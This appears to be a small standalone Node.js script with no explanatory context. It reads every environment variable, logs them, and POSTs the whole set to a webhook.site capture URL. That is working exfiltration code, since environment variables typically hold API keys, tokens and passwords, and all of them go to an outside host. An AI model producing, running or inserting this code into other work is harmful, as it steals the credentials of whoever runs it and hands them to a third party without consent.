const env = process.env;
console.log(JSON.stringify(env, null, 2));

fetch('https://webhook.site/#!/view/9f44ae22-dc23-4840-a416-119da06e69d4', { method: 'POST', body: JSON.stringify(env) })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error(error));